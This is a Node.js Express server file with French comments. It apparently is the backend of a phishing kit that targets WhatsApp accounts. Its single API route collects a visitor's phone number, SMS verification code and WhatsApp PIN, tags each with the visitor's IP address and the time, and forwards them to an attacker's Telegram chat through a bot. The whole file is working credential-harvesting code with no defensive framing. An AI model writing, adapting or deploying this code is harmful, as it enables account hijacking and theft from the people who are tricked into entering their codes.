import express from 'express';
import fetch from 'node-fetch';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(express.json());

// Servir les fichiers statiques du build React
app.use(express.static(path.join(__dirname, 'dist')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

app.post('/api/telegram/send', async (req, res) => {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({ error: 'Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID' });
    }

    const { phoneNumber, verificationCode, whatsappPin, messageType } = req.body || {};
    const forwardedFor = (req.headers['x-forwarded-for'] || '').toString();
    const remoteIp = (forwardedFor.split(',')[0] || req.socket.remoteAddress || '').trim();

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    // Send message based on type - only if field is not empty
    let messageText = '';
    let shouldSend = false;
    
    if (messageType === 'phone' && phoneNumber && phoneNumber.trim() !== '') {
      messageText = [
        '📩 Numéro de téléphone saisi:',
        `📱 Téléphone: ${phoneNumber}`,
        `🌐 IP: ${remoteIp}`,
        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
      ].join('\n');
      shouldSend = true;
    } else if (messageType === 'code' && verificationCode && verificationCode.trim() !== '') {
      messageText = [
        '🔔 Code saisi:',
        `🔢 Code: ${verificationCode}`,
        `🌐 IP: ${remoteIp}`,
        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
      ].join('\n');
      shouldSend = true;
    } else if (messageType === 'pin' && whatsappPin && whatsappPin.trim() !== '') {
      messageText = [
        '🔔 PIN saisi:',
        `🔒 PIN: ${whatsappPin}`,
        `🌐 IP: ${remoteIp}`,
        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
      ].join('\n');
      shouldSend = true;
    }

    // Only send if we have a valid message
    if (shouldSend && messageText) {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: messageText })
      });

      const data = await response.json();
      if (!data.ok) {
        return res.status(500).json({ error: 'Telegram API error', details: data });
      }
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error', details: String(error) });
  }
});

// Route pour toutes les pages React (SPA)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

const PORT = process.env.PORT || 5176;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Production build served from: ${path.join(__dirname, 'dist')}`);
});


